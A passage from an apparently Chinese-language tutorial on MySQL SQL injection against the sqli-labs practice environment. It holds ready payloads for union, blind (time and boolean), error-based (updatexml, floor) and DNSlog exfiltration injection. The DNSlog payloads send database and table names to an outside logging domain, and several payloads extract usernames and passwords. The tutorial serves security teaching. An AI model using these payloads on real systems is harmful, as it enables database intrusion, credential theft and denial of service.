</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>union</span><span class=w> </span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=n>group_concat</span><span class=p>(</span><span class=n>id</span><span class=p>,</span><span class=n>email_id</span><span class=p>),</span><span class=mi>3</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=k>security</span><span class=p>.</span><span class=n>emails</span></span></span></code></pre></td></tr></table></div></div><h2 id=5时间型盲注布尔型盲注>5、时间型盲注&布尔型盲注</h2><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。</p><div class="details admonition abstract open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-list-ul fa-fw" aria-hidden=true></i>摘要<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p><strong>时间型</strong>：通过注入特定语句，根据页面请求的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点。</p><p><strong>布尔型</strong>：页面只返回 True 和 False 两种状态(类型)页面。利用页面返回不同，逐个猜解数据。</p></div></div></div><h3 id=51-原理示意>5.1 原理示意</h3><div class=highlight id=id-3><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>select * from user where id = &#39;?&#39;
</span></span><span class=line><span class=cl>?` 为用户输入，替代为：`4&#39; and sleep(3)#</span></span></code></pre></td></tr></table></div></div><p>实际执行的 SQL 语句：<code>select * from user where id = '4' and sleep(3)#</code></p><p>当 ID = 4 存在时，sleep 3 秒</p><p>当 ID = 4 不存在时，直接返回</p><p>整条拼接出来的 SQL 是正确的就执行 sleep，前面错误（不存在），sleep(3) 不执行</p><h3 id=52-常用函数>5.2 常用函数</h3><h4 id=521-编码转换函数>5.2.1 编码转换函数</h4><p><code>ord('a')</code>：将字符转化为 ascii 码</p><p><code>ascii('a')</code>：将字符转化为 ascii 码</p><p><code>char(97)</code>：将 ascii 转化为字符</p><h4 id=522-条件判断函数>5.2.2 条件判断函数</h4><p><code>if(exp1, exp2, exp3)</code>：exp1 成立，执行 exp2，否则执行 exp3。</p><p>case when then 函数：<code>select case when username="admin" then sleep(1) else "error" end from wp_user_</code></p><h4 id=523-截取函数>5.2.3 截取函数</h4><p><strong>substr 函数</strong></p><p><code>substr(str, pos, len)</code>：从 pos 位置开始，截取字符串 str 的 len 长度</p><p><code>substr(str from pos for length)</code> ：可以用在过滤了 <code>,</code> 的情况</p><p><strong>substring 函数</strong></p><p><code>substring(str, pos, len)</code>：从 pos 位置开始，截取字符串 str 的 len 长度</p><p><code>substring(str from pos for length)</code> ：可以用在过滤了 <code>,</code> 的情况</p><p>注意：pos 从 1 开始</p><div class=highlight id=id-4><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>if</span><span class=p>(</span><span class=n>ord</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>))</span><span class=o>=</span><span class=mi>116</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span><span class=o>%</span><span class=mi>23</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=k>substring</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><strong>mid 函数</strong></p><p><code>mid(str, pos, length)</code>
<code>mid(str from pos for length)</code></p><div class=highlight id=id-5><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>mid</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>for</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=n>mid</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><strong>left 函数</strong></p><p>从左开始截取字符串</p><p><code>left(str, len)</code></p><div class=highlight id=id-6><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=k>left</span><span class=p>(</span><span class=k>database</span><span class=p>(),</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span></span></span></code></pre></td></tr></table></div></div><p><strong>right 函数</strong></p><p>从右开始截取字符串</p><p><code>right(str, len)</code></p><p><strong>利用正则表达式逐位匹配</strong></p><div class=highlight id=id-7><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=n>rlike</span><span class=w> </span><span class=s2>&#34;^1&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=n>REGEXP</span><span class=w> </span><span class=s2>&#34;^1&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=n>REGEXP</span><span class=w> </span><span class=s2>&#34;^12&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>...</span></span></span></code></pre></td></tr></table></div></div><h4 id=524-延时函数>5.2.4 延时函数</h4><p><code>sleep(n)</code>：程序挂起 n 秒</p><div class=highlight id=id-8><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=n>ascii</span><span class=p>(</span><span class=n>substr</span><span class=p>(</span><span class=k>database</span><span class=p>()</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=mi>0</span><span class=p>))</span><span class=o>=</span><span class=mi>97</span><span class=p>,</span><span class=w> </span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>),</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p><code>benchmark(count, sha(1))</code>：执行 sha(1) 函数 count 次达到延时的目的</p><div class=highlight id=id-9><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>BENCHMARK</span><span class=p>(</span><span class=mi>10000000</span><span class=p>,</span><span class=w> </span><span class=n>sha</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span></span></span></code></pre></td></tr></table></div></div><p>利用笛卡尔积制造延时：</p><div class=highlight id=id-10><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=n>A</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=n>B</span><span class=p>,</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>C</span><span class=p>;</span></span></span></code></pre></td></tr></table></div></div><p><strong>实际测试使用information_schema.columns并不稳定，对于不同的网站效果不同，太少会没有明显延时效果，太多则会导致数据库崩溃</strong></p><p>使用<code>character_sets</code>（41行）和<code>collations</code>（222行）效果可能会好点，因为数据量相对计较统一</p><p>利用正则表达式匹配长字符串制造延时：</p><div class=highlight id=id-11><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=mi>1</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>IF</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>concat</span><span class=p>(</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>),</span><span class=n>rpad</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=mi>999999</span><span class=p>,</span><span class=s1>&#39;a&#39;</span><span class=p>))</span><span class=w> </span><span class=n>RLIKE</span><span class=w> </span><span class=s1>&#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h4 id=525-其它函数>5.2.5 其它函数</h4><p><code>count()</code>：计算总数</p><p><code>length()</code>：返回字符串的长度</p><h2 id=6盲注的加速方式>6、盲注的加速方式</h2><div class="details admonition info open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-info-circle fa-fw" aria-hidden=true></i>信息<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>1、利用DNSlog加速注入(windows平台)</p><p>2、利用二分法加速注入</p></div></div></div><h3 id=61-dnslog注入>6.1 DNSlog注入</h3><h4 id=基本原理>基本原理</h4><img src=https://s1.vika.cn/space/2023/04/01/3ac876b9b1a6472d9ecadd492edc24b1 style=zoom:80%><p>除了了解基本原理，还要了解两个概念UNC路径、secure_file_priv和必备条件</p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>必备条件<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>1、MYSQL开启load_file()</p><p>2、Windows平台</p><p>3、DNSlog平台</p></div></div></div><h4 id=unc路径>UNC路径</h4><div class="details admonition question open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-question-circle fa-fw" aria-hidden=true></i>问题<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>什么是UNC路径？</p><p>UNC路径就是类似 \\softer 这样的形式的网络路径</p><p>例子：<code>\\www.test.com\abc.txt</code></p><p>不过也可以这样写<code>//www.test.com/abc.txt 推荐</code></p><p>tip: 读取远程文件就要用到UNC路径</p></div></div></div><h4 id=secure_file_priv>secure_file_priv</h4><p>secure_file_priv的值，默认为NULL，可选项如下：</p><ul><li>secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。</li><li>secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。</li><li>secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</li></ul><h4 id=load_file函数>load_file函数</h4><p>使用案例：<code>select load_file('D:/1.txt') as result;</code>读取D盘中的1.txt文件内容：load file test</p><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>注意<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content>使用该函数必须有权限读取并且文件必须完全可读</div></div></div><img src=https://s1.vika.cn/space/2023/04/01/ec607759342d4a36a644737b486d4c91><h4 id=dnslog盲注实例>DNSlog盲注实例</h4><p>以sql-labs题目的第八题为例：</p><img src=https://s1.vika.cn/space/2023/04/01/f47558521b30421b896be34f2c1e8395 style=zoom:67%><div class=highlight id=id-12><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--获取当前数据库名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>localhost</span><span class=o>/</span><span class=n>sqli</span><span class=o>-</span><span class=n>labs</span><span class=o>/</span><span class=k>Less</span><span class=o>-</span><span class=mi>8</span><span class=o>/?</span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=s1>&#39; and load_file(concat(&#39;</span><span class=o>//</span><span class=s1>&#39;,database(),&#39;</span><span class=p>.</span><span class=mi>0</span><span class=n>e9cc54a</span><span class=p>.</span><span class=n>ipv6</span><span class=p>.</span><span class=mi>1433</span><span class=p>.</span><span class=n>eu</span><span class=p>.</span><span class=n>org</span><span class=o>/</span><span class=n>a</span><span class=s1>&#39;))--+
</span></span></span><span class=line><span class=cl><span class=s1>--获取表名
</span></span></span><span class=line><span class=cl><span class=s1>http://localhost/sqli-labs/Less-8/?id=1&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=n>load_file</span><span class=p>(</span><span class=n>concat</span><span class=p>(</span><span class=s1>&#39;//&#39;</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s1>&#39;security&#39;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=s1>&#39;.0e9cc54a.ipv6.1433.eu.org/a&#39;</span><span class=p>))</span><span class=c1>--+
</span></span></span><span class=line><span class=cl><span class=c1>--后续的步骤与手动注入类似</span></span></span></code></pre></td></tr></table></div></div><p>下图是获取到的表名：</p><img src=https://s1.vika.cn/space/2023/04/01/a8050e2c2e8f46ac9b35a39d659a8f2e style=zoom:80%><div class="details admonition note open"><div class="details-summary admonition-title"><i class="icon fa-solid fa-pencil-alt fa-fw" aria-hidden=true></i>注意事项<i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class=details-content><div class=admonition-content><p>1、由于每一级域名的长度只能为63个字符，长度过长时需要截断获取</p><p>2、因为存在特殊符号时无法解析所以常对查询内容使用hex编码</p><p>3、Linux服务器没有unc路径，也就无法使用dnslog注入</p><p>4、读取文件必须小于<code>max_allowed_packet</code></p></div></div></div><h2 id=7报错型注入>7、报错型注入</h2><h3 id=71-原理>7.1 原理</h3><blockquote><p>用于使用 SQL 语句报错的语法，用于注入结果无回显，但显示错误信息有输出的情况</p><p>返回的信息即是攻击者需要的信息</p></blockquote><p>MySQL 报错注入主要分为以下几类：</p><ol><li>BigInt 等数据类型溢出</li><li>Xpath 语法错误</li><li>count() + rand() + group by 导致主键重复</li><li>空间数据类型函数错误</li></ol><h3 id=72-常用函数>7.2 常用函数</h3><h4 id=721-updatexml>7.2.1 updatexml</h4><blockquote><p>updatexml 第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。</p><p>报错长度最大为 32 位</p></blockquote><div class=highlight id=id-13><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=c1>--显示当前数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,</span><span class=w> </span><span class=k>database</span><span class=p>()),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--显示所有数据库
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>schema_name</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>INFORMATION_SCHEMA</span><span class=p>.</span><span class=n>SCHEMATA</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=n>x</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--获取表名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>table_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=s2>&#34;sectest&#34;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=n>x</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>make_set</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;~&#39;</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>table_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>table_schema</span><span class=o>=</span><span class=k>database</span><span class=p>())),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--获取列名
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>column_name</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>COLUMNS</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s2>&#34;wp_user_&#34;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>make_set</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;~&#39;</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>group_concat</span><span class=p>(</span><span class=k>column_name</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>columns</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>table_name</span><span class=o>=</span><span class=s2>&#34;users&#34;</span><span class=p>)),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>--获取数据
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>username</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>password</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>username</span><span class=o>=</span><span class=s2>&#34;admin&#34;</span><span class=w> </span><span class=k>limit</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>CONCAT</span><span class=p>(</span><span class=mi>0</span><span class=n>x7e</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=n>GROUP_CONCAT</span><span class=p>(</span><span class=n>username</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=n>x3a</span><span class=p>,</span><span class=w> </span><span class=n>password</span><span class=p>)</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>wp_user_</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>id</span><span class=o>=</span><span class=mi>1</span><span class=p>),</span><span class=w> </span><span class=mi>0</span><span class=n>x7e</span><span class=p>),</span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>updatexml</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=n>make_set</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=s1>&#39;~&#39;</span><span class=p>,(</span><span class=k>select</span><span class=w> </span><span class=k>data</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>users</span><span class=p>)),</span><span class=mi>1</span><span class=p>)</span><span class=o>#</span></span></span></code></pre></td></tr></table></div></div><h4 id=722-floor-显错注入>7.2.2 floor 显错注入</h4><div class=highlight id=id-14><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>and</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=p>(</span><span class=k>select</span><span class=w> </span><span class=k>count</span><span class=p>(</span><span class=o>*</span><span class=p>),</span><span class=w> </span><span class=n>concat</span><span class=p>(</span><span class=k>user</span><span class=p>(),</span><span class=w> </span><span class=n>floor</span><span class=p>(</span><span class=n>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>))</span><span class=n>x</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>information_schema</span><span class=p>.</span><span class=n>tables</span><span class=w> </span><span class=k>group</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>x</span><span class=p>)</span><span class=n>a</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
